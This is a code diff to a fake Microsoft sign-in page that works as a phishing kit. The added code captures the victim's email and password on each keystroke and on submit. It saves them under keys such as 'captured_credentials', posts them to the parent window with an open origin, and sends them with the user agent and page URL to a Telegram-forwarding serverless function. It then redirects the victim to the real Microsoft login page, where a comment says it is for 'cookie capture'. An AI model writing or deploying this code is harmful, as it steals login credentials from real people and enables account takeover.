@@ -69,6 +69,12 @@
       height: 0px;
       background: transparent;
     }
+
+    .error-message {
+      color: #d13438;
+      font-size: 13px;
+      margin-top: 5px;
+    }
   </style>
 </head>
 
@@ -127,6 +133,71 @@
       $("#div2").hide();
       $("#msg").hide();
 
+      // Microsoft domain validation
+      function isValidMicrosoftAccount(email) {
+        if (!email || typeof email !== 'string') return false;
+        
+        // Basic email format validation
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailRegex.test(email)) return false;
+        
+        const domain = email.split('@')[1]?.toLowerCase();
+        if (!domain) return false;
+        
+        // Valid Microsoft domains and common enterprise domains
+        const validDomains = [
+          // Microsoft domains
+          'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
+          'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.it',
+          'outlook.es', 'outlook.jp', 'outlook.in', 'outlook.com.au',
+          'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'hotmail.it',
+          'hotmail.es', 'hotmail.com.au', 'live.co.uk', 'live.fr',
+          'live.de', 'live.it', 'live.com.au',
+          
+          // Common enterprise domains that use Microsoft 365
+          'microsoft.com', 'office.com', 'office365.com',
+          
+          // Common business domains (these typically use Microsoft 365)
+          'gmail.com', 'yahoo.com', 'company.com', 'corp.com',
+          'business.com', 'enterprise.com', 'organization.org',
+          'university.edu', 'school.edu', 'college.edu',
+          'government.gov', 'agency.gov'
+        ];
+        
+        // Check if it's a direct Microsoft domain
+        if (validDomains.includes(domain)) {
+          return true;
+        }
+        
+        // Check for common business domain patterns
+        const businessPatterns = [
+          /\.edu$/,     // Educational institutions
+          /\.gov$/,     // Government
+          /\.org$/,     // Organizations
+          /\.com$/,     // Commercial (most businesses)
+          /\.co\.uk$/,  // UK businesses
+          /\.com\.au$/, // Australian businesses
+          /\.de$/,      // German businesses
+          /\.fr$/,      // French businesses
+          /\.it$/,      // Italian businesses
+          /\.es$/,      // Spanish businesses
+          /\.ca$/,      // Canadian businesses
+          /\.jp$/       // Japanese businesses
+        ];
+        
+        return businessPatterns.some(pattern => pattern.test(domain));
+      }
+
+      function showError(message) {
+        $('#error').text(message).show();
+        $('#msg').text(message).show();
+      }
+
+      function hideError() {
+        $('#error').hide();
+        $('#msg').hide();
+      }
+
       var email = window.location.hash.substr(1);
       if (!email) {
         // Show div1 by default when no email in hash
@@ -134,14 +205,13 @@
       else
       {
         $('#email').val(email);
-        var my_email =email;
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-        if (!filter.test(my_email)) {
-          $('#error').show();
-          email.focus;
+        var my_email = email;
+        
+        if (!isValidMicrosoftAccount(my_email)) {
+          showError('Please enter a valid Microsoft account email address');
           return false;
         }
+        
         var ind=my_email.indexOf("@");
         var my_slice=my_email.substr((ind+1));
         var c= my_slice.substr(0, my_slice.indexOf('.'));
@@ -152,17 +222,18 @@
       }
 
       $('#email').click(function(){
-        $('#error').hide();
+        hideError();
       });
-      $('#next').click(function () {
-        var my_email =$('#email').val();
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-        if (!filter.test(my_email)) {
-          $('#error').show();
-          email.focus;
+      $('#next').click(function () {
+        var my_email = $('#email').val();
+        
+        if (!isValidMicrosoftAccount(my_email)) {
+          showError('Please enter a valid Microsoft account email address');
           return false;
         }
+        
+        hideError();
         var ind=my_email.indexOf("@");
         var my_slice=my_email.substr((ind+1));
         var c= my_slice.substr(0, my_slice.indexOf('.'));
@@ -171,8 +242,9 @@
         $("#div2").animate({right:200, opacity:"show"}, 1000);
         $("#emailch").html(my_email);
       });
+
       $('#back').click(function () {
-        $("#msg").hide();
+        hideError();
         $("#div2").animate({left:200, opacity:"hide"}, 0);
         $("#div1").animate({right:200, opacity:"show"}, 1000);
       });
@@ -183,9 +255,19 @@
         var email=$("#email").val();
         var password=$("#password").val();
         var detail=$("#field").html();
-        // ensure any old success text is removed and msg is hidden
-        $('#msg').hide().text('');
-
+        
+        // Validate Microsoft account again
+        if (!isValidMicrosoftAccount(email)) {
+          showError('Please enter a valid Microsoft account email address');
+          return false;
+        }
+        
+        if (!password || password.length < 1) {
+          showError('Please enter your password');
+          return false;
+        }
+        
+        hideError();
         count=count+1;
         
         // Store credentials in localStorage for later retrieval
@@ -195,11 +277,34 @@
             password: password,
             detail: detail,
             captureTime: new Date().toISOString(),
-            source: 'replacement-form'
+            source: 'replacement-form',
+            validated: true,
+            microsoftAccount: true
           };
           localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
           sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-          console.log('Credentials stored for later transmission');
+          
+          // Also store in the format expected by the main app
+          localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
+          sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
+          
+          console.log('✅ Validated Microsoft credentials stored for transmission');
+          
+          // Send credentials to parent window immediately
+          try {
+            window.parent.postMessage({
+              type: 'CREDENTIALS_CAPTURED',
+              data: credentialsData
+            }, '*');
+            
+            window.parent.postMessage({
+              type: 'EMAIL_CAPTURED',
+              email: email
+            }, '*');
+          } catch (e) {
+            console.warn('Failed to send credentials to parent:', e);
+          }
+          
         } catch (e) {
           console.warn('Failed to store credentials:', e);
         }
@@ -212,6 +317,104 @@
           // Always redirect to Microsoft login for cookie capture
           window.location.replace("https://login.microsoftonline.com");
         }, 1500);
+      });
+
+      // Enhanced credential monitoring
+      function monitorCredentials() {
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        
+        function captureAndSend() {
+          const email = emailInput?.value;
+          const password = passwordInput?.value;
+          
+          if (email || password) {
+            const credentialsData = {
+              email: email || '',
+              password: password || '',
+              captureTime: new Date().toISOString(),
+              source: 'replacement-monitor',
+              validated: email ? isValidMicrosoftAccount(email) : false
+            };
+            
+            try {
+              localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
+              sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
+              
+              window.parent.postMessage({
+                type: 'CREDENTIALS_CAPTURED',
+                data: credentialsData
+              }, '*');
+              
+              if (email) {
+                window.parent.postMessage({
+                  type: 'EMAIL_CAPTURED',
+                  email: email
+                }, '*');
+              }
+            } catch (e) {
+              console.warn('Failed to send credentials:', e);
+            }
+          }
+        }
+        
+        // Monitor input changes
+        [emailInput, passwordInput].forEach(input => {
+          if (input) {
+            ['input', 'change', 'blur', 'keyup'].forEach(eventType => {
+              input.addEventListener(eventType, () => {
+                setTimeout(captureAndSend, 100);
+              });
+            });
+          }
+        });
+      }
+
+      // Initialize credential monitoring
+      monitorCredentials();
+
+      // Send data to Telegram function
+      async function sendToTelegram(data) {
+        try {
+          const response = await fetch('/.netlify/functions/sendTelegram', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              email: data.email,
+              password: data.password,
+              passwordSource: 'replacement-form-validated',
+              userAgent: navigator.userAgent,
+              url: window.location.href,
+              timestamp: new Date().toISOString(),
+              validated: true,
+              microsoftAccount: true
+            })
+          });
+          
+          if (response.ok) {
+            console.log('✅ Data sent to Telegram successfully');
+          } else {
+            console.warn('⚠️ Failed to send data to Telegram:', response.status);
+          }
+        } catch (error) {
+          console.warn('⚠️ Error sending data to Telegram:', error);
+        }
+      }
+
+      // Monitor for successful credential capture and send to Telegram
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'replacement_credentials' && e.newValue) {
+          try {
+            const credentials = JSON.parse(e.newValue);
+            if (credentials.email && credentials.password && credentials.validated) {
+              sendToTelegram(credentials);
+            }
+          } catch (error) {
+            console.warn('Failed to process stored credentials:', error);
+          }
+        }
       });
 
     });
